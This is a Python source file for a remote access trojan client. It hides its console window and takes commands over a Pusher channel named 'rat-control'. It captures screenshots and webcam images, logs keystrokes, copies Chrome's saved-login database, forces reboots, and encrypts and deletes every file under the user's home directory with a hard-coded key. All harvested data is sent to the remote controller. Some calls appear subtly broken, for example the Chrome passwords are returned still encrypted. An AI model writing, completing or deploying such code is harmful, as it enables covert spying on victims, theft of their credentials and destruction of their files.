import socket
import sys
import os
import platform
import subprocess
import json
import base64
import time
import threading
import hashlib
import sqlite3
import winreg
import shutil
from PIL import ImageGrab
import cv2
import keyboard
import uuid
import requests
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import pusher

# --- Config ---
PUSHER_KEY = "YOUR_APP_KEY"
PUSHER_CLUSTER = "YOUR_CLUSTER"
APP_ID = "YOUR_APP_ID"
SECRET = "YOUR_SECRET"

# --- Utilities ---
def get_id():
    return f"client_{uuid.uuid4().hex[:8]}"

def get_info():
    info = {
        'os': platform.system(),
        'arch': platform.architecture(),
        'user': os.getenv('USERNAME'),
        'ip': 'N/A',
        'path': os.path.abspath(__file__)
    }
    try:
        info['ip'] = requests.get('https://api.ipify.org').text
    except:
        pass
    return info

def encrypt_file(filepath, key):
    try:
        cipher = AES.new(key, AES.MODE_EAX)
        with open(filepath, 'rb') as f:
            file_bytes = f.read()
        ciphertext, tag = cipher.encrypt_and_digest(file_bytes)
        with open(filepath + '.enc', 'wb') as f:
            f.write(cipher.nonce + tag + ciphertext)
        os.remove(filepath)
    except Exception as e:
        pass

def encrypt_all_files(directory):
    for root, dirs, files in os.walk(directory):
        for file in files:
            if not file.endswith('.enc'):
                encrypt_file(os.path.join(root, file), b'1234567890123456')

# --- Password Stealer ---
def steal_passwords():
    passwords = []
    chrome_path = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data")
    if os.path.exists(chrome_path):
        temp_db = os.path.join(os.environ['TEMP'], 'logins.db')
        shutil.copy2(chrome_path, temp_db)
        try:
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
            for url, user, pwd in cursor.fetchall():
                passwords.append({
                    'site': url,
                    'user': user,
                    'pwd': pwd
                })
            conn.close()
        except:
            pass
        os.remove(temp_db)
    return passwords

# --- Keylogger ---
keylog_active = False
keylog_data = []
def log_key(event):
    if keylog_active:
        keylog_data.append(event.name)

def start_keylogger():
    global keylog_active
    keylog_active = True
    keyboard.hook(log_key)

def stop_keylogger():
    global keylog_active, keylog_data
    keylog_active = False
    keyboard.unhook_all()
    return "".join(keylog_data)

# --- Main Client Logic ---
def connect():
    # Initialize Pusher
    pusher_client = pusher.Pusher(
        app_id=APP_ID,
        key=PUSHER_KEY,
        secret=SECRET,
        cluster=PUSHER_CLUSTER,
        tls=True
    )

    channel = pusher_client.subscribe('rat-control')
    client_id = get_id()
    
    # Announce connection
    pusher_client.trigger('rat-control', 'client_connected', {
        'id': client_id,
        'ip': requests.get('https://api.ipify.org').text if 'requests' in sys.modules else 'Unknown'
    })

    # Subscribe to own private channel for responses
    client_channel = pusher_client.subscribe(f'client_{client_id}')

    def handle_command(data):
        cmd = data.get('cmd')
        
        if cmd == 'get_info':
            info = get_info()
            client_channel.trigger('client_response', {
                'type': 'info',
                'content': json.dumps(info)
            })
            
        elif cmd == 'screenshot':
            img = ImageGrab.grab()
            img.save('temp_screenshot.png', 'PNG')
            with open('temp_screenshot.png', 'rb') as f:
                img_bytes = f.read()
            b64 = base64.b64encode(img_bytes).decode('utf-8')
            client_channel.trigger('client_response', {
                'type': 'screenshot',
                'content': b64
            })
            
        elif cmd == 'webcam':
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            if ret:
                _, encoded = cv2.imencode('.jpg', frame)
                b64 = base64.b64encode(encoded.tobytes()).decode('utf-8')
                client_channel.trigger('client_response', {
                    'type': 'webcam',
                    'content': b64
                })
            cap.release()
            
        elif cmd == 'keylog_start':
            threading.Thread(target=start_keylogger, daemon=True).start()
            client_channel.trigger('client_response', {
                'type': 'status',
                'content': 'Keylogging started'
            })
            
        elif cmd == 'keylog_stop':
            kl = stop_keylogger()
            client_channel.trigger('client_response', {
                'type': 'keylog',
                'content': kl
            })
            
        elif cmd == 'encrypt':
            encrypt_all_files(os.path.expanduser("~"))
            client_channel.trigger('client_response', {
                'type': 'status',
                'content': 'Files encrypted'
            })
            
        elif cmd == 'passwords':
            passwds = steal_passwords()
            client_channel.trigger('client_response', {
                'type': 'passwords',
                'content': json.dumps(passwds)
            })
            
        elif cmd == 'lockdown':
            subprocess.Popen(['cmd', '/c', 'shutdown /r /t 0'])
            client_channel.trigger('client_response', {
                'type': 'status',
                'content': 'Lockdown initiated'
            })

    channel.bind('cmd_send', handle_command)

    # Keep the script running
    while True:
        time.sleep(1)

if __name__ == "__main__":
    # Hide console
    if sys.platform == 'win32':
        import ctypes
        ctypes.windll.kernel32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    
    connect()